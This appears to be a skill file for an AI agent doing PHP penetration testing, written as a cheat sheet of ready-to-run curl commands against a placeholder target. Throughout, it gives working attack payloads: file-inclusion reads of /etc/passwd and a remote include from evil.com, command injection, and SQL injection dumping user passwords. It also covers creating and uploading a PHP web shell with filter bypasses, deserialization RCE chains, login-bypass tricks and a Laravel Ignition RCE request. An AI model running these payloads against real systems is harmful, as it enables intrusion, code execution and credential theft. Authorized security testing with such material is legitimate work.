---
name: php
description: PHP security testing - common vulnerabilities, misconfigurations, and framework-specific attacks
---

# PHP Security Testing

## Fingerprinting

### Identify PHP
```bash
# Check headers
curl -I https://target.com | grep -i "x-powered-by\|server"

# Check for PHP files
curl -s https://target.com/index.php
curl -s https://target.com/info.php
curl -s https://target.com/phpinfo.php

# Check for common PHP frameworks
curl -s https://target.com | grep -iE "(laravel|symfony|codeigniter|cakephp|wordpress|drupal)"
```

### Version Detection
```bash
# Check X-Powered-By header
curl -I https://target.com | grep "X-Powered-By"

# Check phpinfo if exposed
curl -s https://target.com/phpinfo.php | grep -i "php version"

# Check for version in error messages
curl -s https://target.com/nonexistent.php
```

## Common Vulnerabilities

### 1. File Inclusion (LFI/RFI)

**Local File Inclusion**
```bash
# Test for LFI
curl "https://target.com/page.php?file=../../../../etc/passwd"
curl "https://target.com/page.php?file=....//....//....//etc/passwd"
curl "https://target.com/page.php?file=..%2F..%2F..%2Fetc%2Fpasswd"

# PHP wrappers
curl "https://target.com/page.php?file=php://filter/convert.base64-encode/resource=index.php"
curl "https://target.com/page.php?file=php://input" -d "<?php system('id'); ?>"
curl "https://target.com/page.php?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg=="
```

**Remote File Inclusion**
```bash
# Test for RFI (if allow_url_include is enabled)
curl "https://target.com/page.php?file=http://evil.com/shell.txt"
curl "https://target.com/page.php?file=//evil.com/shell.txt"
```

### 2. Command Injection

**Common injection points**
```bash
# Test with various payloads
curl "https://target.com/ping.php?host=127.0.0.1;id"
curl "https://target.com/ping.php?host=127.0.0.1|id"
curl "https://target.com/ping.php?host=127.0.0.1%0aid"
curl "https://target.com/ping.php?host=\`id\`"
curl "https://target.com/ping.php?host=$(id)"
```

### 3. SQL Injection

**MySQL-specific payloads**
```bash
# Union-based
curl "https://target.com/user.php?id=1' UNION SELECT 1,2,3,4--"
curl "https://target.com/user.php?id=1' UNION SELECT username,password,3,4 FROM users--"

# Error-based
curl "https://target.com/user.php?id=1' AND extractvalue(1,concat(0x7e,(SELECT version())))--"
curl "https://target.com/user.php?id=1' AND updatexml(1,concat(0x7e,(SELECT version())),1)--"

# Time-based
curl "https://target.com/user.php?id=1' AND SLEEP(5)--"
curl "https://target.com/user.php?id=1' AND BENCHMARK(10000000,SHA1('test'))--"
```

### 4. File Upload Vulnerabilities

**PHP shell upload**
```bash
# Create PHP shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# Upload with various extensions
curl -F "file=@shell.php" https://target.com/upload.php
curl -F "file=@shell.php.jpg" https://target.com/upload.php
curl -F "file=@shell.php%00.jpg" https://target.com/upload.php
curl -F "file=@shell.phtml" https://target.com/upload.php

# Upload with content-type bypass
curl -F "file=@shell.php;type=image/jpeg" https://target.com/upload.php

# Upload with magic bytes
printf '\xff\xd8\xff\xe0' > shell.jpg.php
cat shell.php >> shell.jpg.php
curl -F "file=@shell.jpg.php" https://target.com/upload.php
```

### 5. Deserialization

**PHP object injection**
```bash
# Test for unserialize vulnerabilities
curl -X POST https://target.com/api.php \
  -H "Content-Type: application/json" \
  -d '{"data": "TzoxOiJB IjoxOntzOjQ6InRlc3QiO3M6NDoiZGF0YSI7fQ=="}'

# Use PHPGGC for gadget chains
phpggc Laravel/RCE1 system id
phpggc Monolog/RCE1 system id
phpggc Symfony/RCE1 system id
```

### 6. Type Juggling

**PHP loose comparison vulnerabilities**
```bash
# Magic hashes (MD5 starting with 0e)
curl -X POST https://target.com/login.php \
  -d "username=admin&password=240610708"

# Array comparison bypass
curl -X POST https://target.com/login.php \
  -d "username=admin&password[]=1"

# Integer overflow
curl -X POST https://target.com/api.php \
  -d "amount=9223372036854775808"
```

## PHP Configuration Attacks

### 1. Exposed phpinfo()
```bash
# Search for phpinfo
curl -s https://target.com/phpinfo.php
curl -s https://target.com/info.php
curl -s https://target.com/test.php

# Extract sensitive information
curl -s https://target.com/phpinfo.php | grep -iE "(document_root|disable_functions|open_basedir|session.save_path)"
```

### 2. Session Hijacking
```bash
# Check session configuration
curl -s https://target.com/phpinfo.php | grep -i "session\."

# Test for session fixation
curl -c cookies.txt https://target.com/login.php
# Check if session ID changes after login
```

### 3. Disable Functions Bypass
```bash
# Check disabled functions
curl -s https://target.com/phpinfo.php | grep "disable_functions"

# Common bypass techniques:
# - FFI (PHP 7.4+)
# - ImageMagick
# - Bash shellshock
# - LD_PRELOAD
# - mod_cgi
```

## Framework-Specific Attacks

### Laravel
```bash
# Check for debug mode
curl -s https://target.com | grep -i "ignition\|whoops\|laravel"

# Exposed .env file
curl -s https://target.com/.env

# Debug mode RCE (CVE-2021-3129)
curl -X POST https://target.com/_ignition/execute-solution \
  -H "Content-Type: application/json" \
  -d '{"solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution", "parameters": {"variableName": "test", "viewFile": "php://filter/write=convert.base64-decode/resource=storage/logs/laravel.log"}}'
```

### WordPress
```bash
# Use wpscan
wpscan --url https://target.com --api-token $WPSCAN_API_KEY

# Manual checks
curl -s https://target.com/wp-login.php
curl -s https://target.com/wp-admin/
curl -s https://target.com/xmlrpc.php
curl -s https://target.com/wp-json/wp/v2/users
```

### Symfony
```bash
# Check for exposed routes
curl -s https://target.com/_profiler/
curl -s https://target.com/_config/

# Check for debug mode
curl -s https://target.com | grep -i "symfony\|profiler"
```

## Testing Checklist

- [ ] Identify PHP version
- [ ] Test for LFI/RFI
- [ ] Test for command injection
- [ ] Test for SQL injection (MySQL-specific)
- [ ] Test file upload vulnerabilities
- [ ] Check for deserialization vulnerabilities
- [ ] Test type juggling attacks
- [ ] Check for exposed phpinfo()
- [ ] Test session security
- [ ] Check disable_functions bypass
- [ ] Test framework-specific vulnerabilities

## Tools

```bash
# PHP vulnerability scanner
phpcs --standard=Security

# SQLMap for MySQL
sqlmap -u "https://target.com/user.php?id=1" --dbms=mysql

# PHPGGC for deserialization
phpggc -l

# Nuclei templates
nuclei -u https://target.com -t ~/nuclei-templates/technologies/php/
```
